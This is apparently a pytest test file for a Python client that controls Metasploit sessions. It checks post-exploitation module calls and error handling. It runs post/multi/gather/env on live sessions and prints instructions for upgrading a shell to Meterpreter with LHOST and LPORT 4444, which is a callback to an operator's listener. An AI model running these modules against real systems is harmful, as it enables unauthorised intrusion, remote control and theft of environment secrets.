"""Test shell upgrade and post module execution."""

import pytest


@pytest.mark.asyncio
async def test_post_module_execution(client):
    """Test running post modules on sessions.

    Note: This test requires an active session.
    If no sessions exist, the test will be skipped.
    """
    # Get active sessions
    session_ids = await client.list_sessions()

    if not session_ids:
        pytest.skip("No active sessions available for post module test")

    # Use first session
    session_id = session_ids[0]

    # Get session info
    session_info = await client.session_get(session_id)
    session_type = session_info.get("type", "")

    print(f"\n✓ Testing post module with session {session_id} (type: {session_type})")

    # Test: Run a simple info-gathering post module
    # Using post/multi/gather/env which just gathers environment variables
    # This should work on any session type
    try:
        success = await client.session_run_post_module(
            session_id=session_id,
            module_path="post/multi/gather/env",
            options={}
        )
        print(f"  Post module execution result: {success}")
        # Note: success might be False if module doesn't support this platform
        # but the API call should work
    except Exception as e:
        print(f"  Post module execution error: {e}")
        # This is acceptable - some modules may not work on all platforms

    print("✓ Post module execution API works")


@pytest.mark.asyncio
async def test_shell_to_meterpreter_api(client):
    """Test shell_to_meterpreter upgrade API (without actually upgrading).

    Note: This test verifies the API exists but doesn't create a real session.
    Full upgrade testing requires a real shell session and network access.
    """
    # Get active sessions
    session_ids = await client.list_sessions()

    if not session_ids:
        pytest.skip("No active sessions available for upgrade test")

    # Use first session
    session_id = session_ids[0]

    # Get session info
    session_info = await client.session_get(session_id)
    session_type = session_info.get("type", "")

    print(f"\n✓ Session {session_id} type: {session_type}")

    if "meterpreter" in session_type.lower():
        pytest.skip("Session is already meterpreter - no upgrade needed")

    print("  Note: To actually upgrade a shell, use:")
    print("  await client.session_run_post_module(")
    print("      session_id=session_id,")
    print("      module_path='post/multi/manage/shell_to_meterpreter',")
    print("      options={'LHOST': 'your_ip', 'LPORT': '4444'}")
    print("  )")

    # Verify the API method exists and is callable
    assert hasattr(client, 'session_run_post_module')
    assert callable(client.session_run_post_module)

    print("✓ Shell upgrade API is available")


@pytest.mark.asyncio
async def test_post_module_invalid_session():
    """Test that post module execution fails gracefully for invalid session."""
    from assassinate.ipc.client import MsfClient

    client = MsfClient()
    await client.connect()

    try:
        # Try to run post module on non-existent session
        with pytest.raises(Exception):
            await client.session_run_post_module(
                session_id=99999,
                module_path="post/multi/gather/env"
            )

        print("✓ Post module properly fails for non-existent session")
    finally:
        await client.disconnect()


@pytest.mark.asyncio
async def test_post_module_invalid_module(client):
    """Test that post module execution fails gracefully for invalid module."""
    # Get active sessions
    session_ids = await client.list_sessions()

    if not session_ids:
        pytest.skip("No active sessions available")

    session_id = session_ids[0]

    # Try to run a non-existent module
    try:
        success = await client.session_run_post_module(
            session_id=session_id,
            module_path="post/invalid/nonexistent/module"
        )
        # Should either raise exception or return False
        assert success is False, "Invalid module should return False"
    except Exception as e:
        # Exception is also acceptable
        print(f"  ✓ Invalid module properly raises exception: {e}")

    print("✓ Invalid module handling works correctly")
